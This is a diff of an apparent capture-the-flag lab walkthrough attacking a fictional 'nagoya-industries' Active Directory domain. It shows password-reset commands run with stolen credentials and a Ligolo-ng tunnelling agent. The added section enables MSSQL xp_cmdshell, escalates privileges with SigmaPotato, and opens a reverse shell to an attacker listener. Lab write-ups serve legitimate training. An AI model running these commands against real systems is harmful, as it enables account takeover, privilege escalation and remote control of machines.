@@ -203,7 +203,7 @@ net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc
 So lets do it!
 
 ```bash
- net rpc password joanna.wood 'Password@' -U nagoya-industries.com/fiona.clark%'Summer2023' -S 192.168.237.21
+ net rpc password svc_helpdesk 'Password@' -U nagoya-industries.com/fiona.clark%'Summer2023' -S 192.168.121.21
 
 or
 
@@ -221,7 +221,7 @@ Last one, Christopher Lewis is member or 5 groups instead of 3 like rest of empl
 
 So now, lest do teh same and change password for chris.
 ```bash
- net rpc password christopher.lewis 'Password@' -U nagoya-industries.com/joanna.wood%'Password@' -S 192.168.209.21
+ net rpc password christopher.lewis 'Password@' -U nagoya-industries.com/svc_helpdesk%'Password@' -S 192.168.121.21
  ```
 
  Now evilwinrm
@@ -296,7 +296,7 @@ WARN[0000] Ligolo-ng API is experimental, and should be running behind a reverse
 
 and then agent:
 ```bash
-*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents> .\agent.exe -ignore-cert -connect 192.168.45.212:11601
+*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents> .\agent.exe -ignore-cert -connect 192.168.45.182:11601
 
 agent.exe : time="2025-10-14T17:04:35-07:00" level=warning msg="warning, certificate validation disabled"
     + CategoryInfo          : NotSpecified: (time="2025-10-1...ation disabled":String) [], RemoteException
@@ -467,4 +467,49 @@ nano /etc/hosts
 now try:
 impacket-mssqlclient -k nagoya.nagoya-industries.com  
 
-![](image-12.png)
+![mssql](image-12.png)
+
+Success!
+try:
+
+```bash
+enable_xp_cmdshell
+
+xp_cmdshell "whoami /priv"
+```
+
+![mssql2](image-13.png)
+
+SeImpersonatePrivilege !!! Thats good, now lets use Sigma potato to finalize this lab.
+
+Firstly, download SigmaPotato:
+```bash
+https://github.com/tylerdotrar/SigmaPotato
+```
+Get latest .exe form releases.
+Then upload it to our compromised Christopher, but use easily accessible/public folder like C:\Temp
+
+![Sigma 1](image-14.png)
+
+Now go back to mssql and run:
+```bash
+xp_cmdshell "C:\Temp\SigmaPotato.exe whoami"
+```
+
+![mssql3](image-15.png)
+
+Nailed it!
+Now lets create rev shell.
+
+We start listener
+
+```bash
+nc -nlvp 1337
+```
+
+And use final command:
+```bash
+"C:\Temp\SigmaPotato.exe --revshell 192.168.45.182 1337"
+```
+Bum! We won ;)
+![Proof](image-16.png)
